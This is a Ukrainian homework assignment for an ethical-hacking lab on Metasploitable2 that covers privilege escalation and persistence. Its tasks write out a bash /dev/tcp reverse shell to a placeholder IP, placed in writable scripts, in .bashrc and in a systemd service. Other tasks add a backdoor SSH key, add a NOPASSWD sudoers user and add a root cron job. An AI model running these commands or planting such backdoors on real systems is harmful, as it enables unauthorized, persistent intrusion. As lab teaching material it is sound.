# 🛡️ Lab 6: домашнє завдання: Privilege Escalation та Закріплення доступу (Metasploitable2)

> **📋 Вимоги:**
>
> - ✅ Виконати всі завдання на віртуальній машині Metasploitable2.
> - 📸 Кожен пункт має супроводжуватись скріншотами або виводом команд (для звіту).
> - ⚠️ Використовувати лише етичні підходи у тестовому середовищі.

---

## 🔓 1. Підвищення привілеїв через world writable files

**Завдання:**

1. 🔍 Знайти файли з правами `-rw-rw-rw-` або `-rwxrwxrwx`:
   ```bash
   find / -writable -type f 2>/dev/null
   ```
2. 🧪 Виявити, чи є серед них виконувані скрипти або бінарники, що викликаються з підвищеними правами (наприклад через sudo/cron).
3. ✍️ Замінити вміст скрипта на payload типу:
   ```bash
   /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
   ```
4. 📞 Отримати реверс шелл.

---

## ⏰ 2. Підвищення привілеїв через crontab

**Завдання:**

1. 🔍 Перевірити `cron` за допомогою:
   ```bash
   cat /etc/crontab
   ls -la /etc/cron.*
   ```
2. ✏️ Якщо є скрипти, що виконуються з root, перевірити їх на можливість редагування.
3. 💣 Вставити шкідливий код у відповідний скрипт (аналогічно попередньому завданню).

---

## 🧠 3. Підвищення привілеїв через suggester Metasploit

**Завдання:**

1. 🔗 Отримати початковий шелл (наприклад через vsftpd).
2. 🛠️ Завантажити та запустити `linux/local_exploit_suggester` в Metasploit:
   ```bash
   use post/multi/recon/local_exploit_suggester
   ```
3. 🎯 Спробувати запропоновані експлойти для ескалації привілеїв.
4. 📝 Зафіксувати, який метод спрацював.

---

## 🔐 4. Закріплення через SSH ключі

**Завдання:**

1. 🗝️ Створити SSH ключ:
   ```bash
   ssh-keygen -t rsa -f backdoor_key
   ```
2. 📥 Додати публічний ключ у `~/.ssh/authorized_keys` користувача з високими привілеями.
3. 🔄 Підключитися через приватний ключ:
   ```bash
   ssh -i backdoor_key user@target
   ```

---

## 👤 5. Закріплення через useradd

**Завдання:**

1. ➕ Додати користувача в систему:
   ```bash
   sudo useradd -m -s /bin/bash backdoor
   sudo passwd backdoor
   ```
2. 🧾 Додати його до `sudoers`:
   ```bash
   echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
   ```
3. ✅ Зайти під новим користувачем і перевірити доступ.

---

## 🌀 6. Закріплення через .bashrc

**Завдання:**

1. 🖊️ Додати до `.bashrc` реверс шелл:
   ```bash
   echo "/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> ~/.bashrc
   ```
2. 📡 Запустити netcat на своїй машині:
   ```bash
   nc -lvnp 4444
   ```
3. ⏳ Дочекатися підключення, коли хтось ввійде в систему.

---

## 🕰️ 7. Закріплення через cron

**Завдання:**

1. 🧾 Створити скрипт backdoor.sh з реверс шелом.
2. 📅 Додати в `crontab`:
   ```bash
   echo "* * * * * root /path/to/backdoor.sh" >> /etc/crontab
   ```
3. 📞 Отримати доступ через netcat.

---

## 🧩 8. Закріплення через Systemd

**Завдання:**

1. ⚙️ Створити systemd сервіс:
   ```ini
   [Unit]
   Description=Reverse Shell Service

   [Service]
   ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

   [Install]
   WantedBy=multi-user.target
   ```
2. 💾 Зберегти як `/etc/systemd/system/backdoor.service`
3. 🚀 Активувати:
   ```bash
   systemctl daemon-reexec
   systemctl enable --now backdoor.service
   ```

---

### 📦 Завершення

- 📁 Після виконання кожного завдання заархівувати артефакти: ключі, скріншоти, виводи команд.


